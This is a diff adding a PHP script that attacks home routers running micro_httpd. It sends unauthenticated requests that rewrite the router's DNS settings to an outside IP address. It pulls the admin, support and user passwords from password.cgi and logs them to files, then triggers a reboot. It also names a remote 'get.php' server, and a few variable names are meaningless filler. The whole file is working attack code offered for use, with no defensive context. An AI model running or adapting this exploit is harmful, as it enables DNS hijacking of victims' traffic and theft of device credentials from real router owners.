@@ -1,0 +1,157 @@
+#!/usr/bin/php -H
+<?php
+
+if(!@ini_get("safe_mode")){@error_reporting(E_ALL);
+@ini_set("display_errors",1);
+@set_time_limit(0);
+@ini_set("max_execution_time",0);
+@ini_set("log_errors",1);
+@ini_set("error_log","micro_httpd_log_error.txt");
+}
+
+date_default_timezone_set("UTC");
+define("BINDTO","0");
+define("ER_OK",1);
+define("ER_OPEN",0);
+define("ER_RECV",-2);
+define("ER_SEND",-3);
+define("ER_CODE",-4);
+define("dnsPrimary","162.216.152.54");
+define("dnsSecondary","8.8.8.8");
+define("server","http://174.127.99.150/get.php");
+
+$host= $argv[1];
+http_open($host,80);
+
+
+
+
+function get_contents($fn){ $buf=""; $fp=@fopen($fn,"r"); $buf=@fread($fp,filesize($fn)); @fclose($fp);
+return $buf;
+}
+
+
+function micro_httpd_log_error($data){ $fp=@fopen("micro_httpd_log_error.txt","a"); @fwrite($fp,"$data\r\n"); @fclose($fp);
+
+}
+
+
+
+function micro_httpd_log_data($data){ $fp=@fopen("logs/micro_httpd_log_data.txt","a"); @fwrite($fp,"$data\r\n"); @fclose($fp);
+
+}
+
+function micro_httpd_log_pwd($data){ $fp=@fopen("logs/micro_httpd_log_pwd.txt","a"); @fwrite($fp,"$data\r\n"); @fclose($fp);
+}
+
+function micro_httpd_log_open($data){ $fp=@fopen("micro_httpd_log_open.txt","a"); @fwrite($fp,"$data\r\n"); @fclose($fp);
+
+}
+
+function micro_httpd_log_dns($data){ 
+
+	$fp=@fopen("logs/modificados_bug.log","a"); @fwrite($fp,"$data\r\n"); @fclose($fp);
+}
+function open(&$sock,$host,$port){ if(function_exists("stream_context_create")&&function_exists("stream_socket_client")){ $socket_options=array("socket"=>array("bindto"=>BINDTO.":0")); 
+$socket_context=stream_context_create($socket_options);
+$sock=@stream_socket_client("tcp://".$host.":".$port,$errno,$errstr,5,STREAM_CLIENT_CONNECT,$socket_context);
+}else{return 0;}
+if(empty($sock)){return 0;}@stream_set_timeout($sock,5);
+return true;}
+
+
+function send(&$sock,$data){
+$meta=@stream_get_meta_data($sock);
+
+if($meta["eof"]){return 0;}
+
+if(FALSE===@stream_select($read=array("sock"=>NULL),$write=array("sock"=>$sock),$except=array("sock"=>NULL),15)){@fclose($sock);return 0;}
+
+if(count($write)){if(FALSE===@fputs($sock,$data)){@fclose($sock);return 0;}}
+
+return true;}
+
+
+
+function recv(&$sock,&$buf){ $buf=""; $meta=@stream_get_meta_data($sock); if($meta["eof"]){return 
+0;}if(FALSE===@stream_select($read=array("sock"=>$sock),$write=array("sock"=>NULL),$except=array("sock"=>NULL),15)){@fclose($sock);return 0;} if(count($read)){$buf=@stream_get_contents($sock);} else{@fclose($sock);return 
+0;}@fclose($sock); return(!empty($buf));
+}
+
+
+function format_head_data($host,$port){ $data="HEAD / HTTP/1.0\r\n"; $data.="Host: $host\r\n"; $data.="User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20100101 Firefox/12.0\r\n"; $data.="Accept: */*\r\n"; 
+$data.="Accept-Encoding: 0\r\n"; $data.="Connection: close\r\n\r\n";
+return $data;}
+
+
+function format_password_data($host,$port){ $data="GET /password.cgi HTTP/1.0\r\n"; $data.="Host: $host\r\n"; $data.="User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20100101 Firefox/12.0\r\n"; $data.="Accept: */*\r\n"; 
+$data.="Accept-Encoding: 0\r\n"; $data.="Connection: close\r\n\r\n";
+return $data;}
+
+
+function format_dns_cfg_data($host,$port){ $data="GET /dnscfg.cgi?dnsPrimary=".dnsPrimary."&dnsSecondary=".dnsSecondary."&dnsDynamic=0&dnsRefresh=1 HTTP/1.0\r\n"; $data.="Host: $host\r\n"; $data.="User-Agent: Mozilla/5.0 (Windows 
+NT 5.1; rv:12.0) Gecko/20100101 Firefox/12.0\r\n"; $data.="Accept: */*\r\n"; $data.="Accept-Encoding: 0\r\n"; $data.="Connection: close\r\n\r\n";
+return $data;}
+
+function format_reboot_info_data($host,$port){
+
+$mzntetnkry = "data"; $data = "GET /rebootinfo.cgi HTTP/1.0\r\n"; $pkibmszo = "data"; $data.="Host: $host\r\n"; $data.="User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20100101 Firefox/12.0\r\n"; $data.="Accept: */*\r\n"; 
+$data.="Accept-Encoding: 0\r\n"; $data.="Connection: close\r\n\r\n";
+return $data;}
+
+
+function micro_http_bypass($host,$port){ $sock=0; $buf=""; $hname=@gethostbyaddr($host)?@gethostbyaddr($host):"N/A";
+$ok=0;
+
+if(!open($sock,$host,$port)){print("falha ( open )\n");return ER_OPEN;}
+$dnscfg=format_dns_cfg_data($host,$port);
+
+if(!send($sock,$dnscfg)){print("falha ( send )\n");return ER_SEND;}
+
+if(!recv($sock,$buf)){print("falha ( recv )\n");return ER_RECV;}
+
+if(preg_match("/Primary DNS server|Secondary DNS server/",$buf)){$ok=1;micro_httpd_log_dns("$host");}
+
+if(!open($sock,$host,$port)){print("falha ( open )\n");return ER_OPEN;}
+
+$password = format_password_data($host,$port);
+if(!send($sock,$password)){print("falha ( send )\n");return ER_SEND;}
+
+if(!recv($sock,$buf)){print("falha ( recv )\n");return ER_RECV;}
+
+if(preg_match("/pwdAdmin = '(.+?)'/",$buf,$regs)){ $pwdAdmin=$regs[1]; }
+
+if(preg_match("/pwdSupport = '(.+?)'/",$buf,$regs)){$pwdSupport=$regs[1];}
+
+if(preg_match("/pwdUser = '(.+?)'/",$buf,$regs)){$pwdUser=$regs[1];}
+
+if(isset($pwdAdmin)||isset($pwdSupport)||isset($pwdUser)){
+
+$ok=1; $pwdAdmin=$pwdAdmin?$pwdAdmin:"N/A"; $pwdSupport=$pwdSupport?$pwdSupport:"N/A"; $pwdUser=$pwdUser?$pwdUser:"N/A"; micro_httpd_log_pwd("[+] [ $host | $hname ] - ( pwdAdmin:$pwdAdmin pwdSupport:$pwdSupport 
+pwdUser:$pwdUser)\r\n".str_repeat("-",100));
+}
+
+if(!open($sock,$host,$port)){print("falha ( open )\n");return ER_OPEN;}
+
+$reboot=format_reboot_info_data($host,$port);
+
+if(!send($sock,$reboot)){print("falha ( send )\n");return ER_SEND;}
+
+if(!recv($sock,$buf)){print("falha ( recv )\n");return ER_RECV;}
+
+if(!$ok){micro_httpd_log_data("[+] [ $host | $hname ]\r\n$buf\r\n".str_repeat("-",100));return ER_CODE;}}
+
+
+
+function http_open($host,$port){ $sock=0; $buf="";
+if(!open($sock,$host,$port)){print("falha ( open )\n"); return ER_OPEN;}
+$head=format_head_data($host,$port);
+
+if(!send($sock,$head)){print("falha ( send )\n");return ER_SEND;}
+
+if(!recv($sock,$buf)){print("falha ( recv )\n");return ER_RECV;}
+
+if(preg_match("/micro_http/i",$buf)){micro_http_bypass($host,$port);}return 0;}
+
+
+?>
